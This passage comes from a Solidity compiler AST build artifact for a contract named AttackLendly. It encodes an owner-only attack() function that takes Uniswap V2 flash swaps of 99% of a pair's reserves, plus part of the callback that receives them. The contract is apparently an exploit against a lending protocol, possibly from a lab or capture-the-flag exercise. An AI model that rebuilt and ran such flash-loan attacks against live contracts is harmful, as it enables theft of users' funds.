                      "id": 96,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1250:18:3",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
                        "typeString": "tuple(uint112,uint112,uint32)"
                      }
                    },
                    "src": "1226:42:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 98,
                  "nodeType": "ExpressionStatement",
                  "src": "1226:42:3"
                },
                {
                  "expression": {
                    "id": 105,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 99,
                      "name": "wantedLoan",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 86,
                      "src": "1340:10:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 104,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 102,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "id": 100,
                          "name": "reserve0",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 38,
                          "src": "1353:8:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "3939",
                          "id": 101,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "1364:2:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_99_by_1",
                            "typeString": "int_const 99"
                          },
                          "value": "99"
                        },
                        "src": "1353:13:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "/",
                      "rightExpression": {
                        "hexValue": "313030",
                        "id": 103,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1369:3:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_100_by_1",
                          "typeString": "int_const 100"
                        },
                        "value": "100"
                      },
                      "src": "1353:19:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "1340:32:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 106,
                  "nodeType": "ExpressionStatement",
                  "src": "1340:32:3"
                },
                {
                  "expression": {
                    "id": 112,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 107,
                      "name": "data",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 89,
                      "src": "1382:4:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bytes_memory_ptr",
                        "typeString": "bytes memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 110,
                          "name": "token0",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 33,
                          "src": "1400:6:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IERC20_$564",
                            "typeString": "contract IERC20"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_contract$_IERC20_$564",
                            "typeString": "contract IERC20"
                          }
                        ],
                        "expression": {
                          "id": 108,
                          "name": "abi",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": -1,
                          "src": "1389:3:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_abi",
                            "typeString": "abi"
                          }
                        },
                        "id": 109,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "memberName": "encode",
                        "nodeType": "MemberAccess",
                        "src": "1389:10:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
                          "typeString": "function () pure returns (bytes memory)"
                        }
                      },
                      "id": 111,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1389:18:3",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_bytes_memory_ptr",
                        "typeString": "bytes memory"
                      }
                    },
                    "src": "1382:25:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes_memory_ptr",
                      "typeString": "bytes memory"
                    }
                  },
                  "id": 113,
                  "nodeType": "ExpressionStatement",
                  "src": "1382:25:3"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 117,
                        "name": "wantedLoan",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 86,
                        "src": "1427:10:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 118,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1439:1:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "id": 121,
                            "name": "this",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -28,
                            "src": "1450:4:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_AttackLendly_$373",
                              "typeString": "contract AttackLendly"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_AttackLendly_$373",
                              "typeString": "contract AttackLendly"
                            }
                          ],
                          "id": 120,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1442:7:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 119,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1442:7:3",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 122,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1442:13:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 123,
                        "name": "data",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 89,
                        "src": "1457:4:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes_memory_ptr",
                          "typeString": "bytes memory"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_bytes_memory_ptr",
                          "typeString": "bytes memory"
                        }
                      ],
                      "expression": {
                        "id": 114,
                        "name": "pair",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 30,
                        "src": "1417:4:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                          "typeString": "contract IUniswapV2Pair"
                        }
                      },
                      "id": 116,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "swap",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 851,
                      "src": "1417:9:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$_t_uint256_$_t_address_$_t_bytes_memory_ptr_$returns$__$",
                        "typeString": "function (uint256,uint256,address,bytes memory) external"
                      }
                    },
                    "id": 124,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1417:45:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 125,
                  "nodeType": "ExpressionStatement",
                  "src": "1417:45:3"
                },
                {
                  "expression": {
                    "id": 132,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "components": [
                        {
                          "id": 126,
                          "name": "reserve0",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 38,
                          "src": "1593:8:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 127,
                          "name": "reserve1",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 40,
                          "src": "1603:8:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        null
                      ],
                      "id": 128,
                      "isConstant": false,
                      "isInlineArray": false,
                      "isLValue": true,
                      "isPure": false,
                      "lValueRequested": true,
                      "nodeType": "TupleExpression",
                      "src": "1592:21:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_tuple$_t_uint256_$_t_uint256_$__$",
                        "typeString": "tuple(uint256,uint256,)"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [],
                      "expression": {
                        "argumentTypes": [],
                        "expression": {
                          "id": 129,
                          "name": "pair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 30,
                          "src": "1616:4:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                            "typeString": "contract IUniswapV2Pair"
                          }
                        },
                        "id": 130,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getReserves",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 809,
                        "src": "1616:16:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
                          "typeString": "function () view external returns (uint112,uint112,uint32)"
                        }
                      },
                      "id": 131,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1616:18:3",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
                        "typeString": "tuple(uint112,uint112,uint32)"
                      }
                    },
                    "src": "1592:42:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 133,
                  "nodeType": "ExpressionStatement",
                  "src": "1592:42:3"
                },
                {
                  "expression": {
                    "id": 140,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 134,
                      "name": "wantedLoan",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 86,
                      "src": "1644:10:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 139,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 137,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "id": 135,
                          "name": "reserve1",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 40,
                          "src": "1657:8:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "3939",
                          "id": 136,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "1668:2:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_99_by_1",
                            "typeString": "int_const 99"
                          },
                          "value": "99"
                        },
                        "src": "1657:13:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "/",
                      "rightExpression": {
                        "hexValue": "313030",
                        "id": 138,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1673:3:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_100_by_1",
                          "typeString": "int_const 100"
                        },
                        "value": "100"
                      },
                      "src": "1657:19:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "1644:32:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 141,
                  "nodeType": "ExpressionStatement",
                  "src": "1644:32:3"
                },
                {
                  "expression": {
                    "id": 147,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 142,
                      "name": "data",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 89,
                      "src": "1686:4:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bytes_memory_ptr",
                        "typeString": "bytes memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 145,
                          "name": "token1",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 36,
                          "src": "1704:6:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IERC20_$564",
                            "typeString": "contract IERC20"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_contract$_IERC20_$564",
                            "typeString": "contract IERC20"
                          }
                        ],
                        "expression": {
                          "id": 143,
                          "name": "abi",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": -1,
                          "src": "1693:3:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_abi",
                            "typeString": "abi"
                          }
                        },
                        "id": 144,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "memberName": "encode",
                        "nodeType": "MemberAccess",
                        "src": "1693:10:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
                          "typeString": "function () pure returns (bytes memory)"
                        }
                      },
                      "id": 146,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1693:18:3",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_bytes_memory_ptr",
                        "typeString": "bytes memory"
                      }
                    },
                    "src": "1686:25:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes_memory_ptr",
                      "typeString": "bytes memory"
                    }
                  },
                  "id": 148,
                  "nodeType": "ExpressionStatement",
                  "src": "1686:25:3"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "hexValue": "30",
                        "id": 152,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1731:1:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "id": 153,
                        "name": "wantedLoan",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 86,
                        "src": "1734:10:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "id": 156,
                            "name": "this",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -28,
                            "src": "1754:4:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_AttackLendly_$373",
                              "typeString": "contract AttackLendly"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_AttackLendly_$373",
                              "typeString": "contract AttackLendly"
                            }
                          ],
                          "id": 155,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1746:7:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 154,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1746:7:3",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 157,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1746:13:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 158,
                        "name": "data",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 89,
                        "src": "1761:4:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes_memory_ptr",
                          "typeString": "bytes memory"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_bytes_memory_ptr",
                          "typeString": "bytes memory"
                        }
                      ],
                      "expression": {
                        "id": 149,
                        "name": "pair",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 30,
                        "src": "1721:4:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                          "typeString": "contract IUniswapV2Pair"
                        }
                      },
                      "id": 151,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "swap",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 851,
                      "src": "1721:9:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$_t_uint256_$_t_address_$_t_bytes_memory_ptr_$returns$__$",
                        "typeString": "function (uint256,uint256,address,bytes memory) external"
                      }
                    },
                    "id": 159,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1721:45:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 160,
                  "nodeType": "ExpressionStatement",
                  "src": "1721:45:3"
                }
              ]
            },
            "functionSelector": "9e5faafc",
            "id": 162,
            "implemented": true,
            "kind": "function",
            "modifiers": [
              {
                "id": 83,
                "kind": "modifierInvocation",
                "modifierName": {
                  "id": 82,
                  "name": "onlyOwner",
                  "nodeType": "IdentifierPath",
                  "referencedDeclaration": 405,
                  "src": "1094:9:3"
                },
                "nodeType": "ModifierInvocation",
                "src": "1094:9:3"
              }
            ],
            "name": "attack",
            "nameLocation": "1076:6:3",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 81,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1082:2:3"
            },
            "returnParameters": {
              "id": 84,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1104:0:3"
            },
            "scope": 373,
            "src": "1067:707:3",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 339,
              "nodeType": "Block",
              "src": "1915:1464:3",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 180,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 174,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -15,
                            "src": "1977:3:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 175,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "src": "1977:10:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "arguments": [
                            {
                              "id": 178,
                              "name": "pair",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 30,
                              "src": "1999:4:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                                "typeString": "contract IUniswapV2Pair"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                                "typeString": "contract IUniswapV2Pair"
                              }
                            ],
                            "id": 177,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "1991:7:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 176,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "1991:7:3",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 179,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1991:13:3",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "1977:27:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "6e6f742070616972",
                        "id": 181,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2006:10:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_a6db26ec765ebd5d122b28a0efe9eac2bafa05453cfed61dad88f7c3cd84b3e8",
                          "typeString": "literal_string \"not pair\""
                        },
                        "value": "not pair"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_a6db26ec765ebd5d122b28a0efe9eac2bafa05453cfed61dad88f7c3cd84b3e8",
                          "typeString": "literal_string \"not pair\""
                        }
                      ],
                      "id": 173,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "1969:7:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 182,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1969:48:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 183,
                  "nodeType": "ExpressionStatement",
                  "src": "1969:48:3"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 190,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "id": 185,
                          "name": "sender",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 164,
                          "src": "2035:6:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "arguments": [
                            {
                              "id": 188,
                              "name": "this",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -28,
                              "src": "2053:4:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_AttackLendly_$373",
                                "typeString": "contract AttackLendly"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_AttackLendly_$373",
                                "typeString": "contract AttackLendly"
                              }
                            ],
                            "id": 187,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "2045:7:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 186,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "2045:7:3",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 189,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2045:13:3",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "2035:23:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "6e6f742073656e646572",
                        "id": 191,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2060:12:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_d37117992f622fb6e31835364ec3612f87eb1116ac0f4c00172c0024a21c7954",
                          "typeString": "literal_string \"not sender\""
                        },
                        "value": "not sender"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_d37117992f622fb6e31835364ec3612f87eb1116ac0f4c00172c0024a21c7954",
                          "typeString": "literal_string \"not sender\""
                        }
                      ],
                      "id": 184,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "2027:7:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 192,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2027:46:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 193,
                  "nodeType": "ExpressionStatement",
                  "src": "2027:46:3"
                },
                {
                  "assignments": [
                    196
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 196,
                      "mutability": "mutable",
                      "name": "token",
                      "nameLocation": "2167:5:3",
                      "nodeType": "VariableDeclaration",
                      "scope": 339,
                      "src": "2160:12:3",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IERC20_$564",
                        "typeString": "contract IERC20"
                      },
                      "typeName": {
                        "id": 195,
                        "nodeType": "UserDefinedTypeName",
                        "pathNode": {
                          "id": 194,
                          "name": "IERC20",
                          "nodeType": "IdentifierPath",
                          "referencedDeclaration": 564,
                          "src": "2160:6:3"
                        },
                        "referencedDeclaration": 564,
                        "src": "2160:6:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$564",
